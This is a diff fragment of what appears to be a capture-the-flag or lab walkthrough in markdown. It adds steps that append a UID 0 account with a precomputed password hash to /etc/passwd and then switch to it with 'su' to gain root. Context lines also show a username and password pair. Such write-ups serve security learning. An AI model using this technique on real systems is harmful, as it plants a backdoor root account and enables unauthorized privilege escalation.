@@ -136,4 +136,16 @@ Credentials: falaraki:Transclisiation
 $1$random$UuecLMKsRjAA/tqoL9SKL.
 ```
 ![image](https://user-images.githubusercontent.com/83878909/234854606-78438923-1830-4c04-9d3f-56fad5e1c9f8.png)
+![image](https://user-images.githubusercontent.com/83878909/234857915-f2626cb8-6892-4cc5-b96a-a0d40cb62e5c.png)
 
+  - Add the below line to `/etc/passwd`
+```CSS
+random:$1$random$UuecLMKsRjAA/tqoL9SKL.:0:0:root:/bin/bash
+```
+  - Switch User as Root
+```
+▶ su random
+```
+![image](https://user-images.githubusercontent.com/83878909/234858785-9d3286e7-8f0b-45db-b7f4-3092e65afc81.png)
+
+---
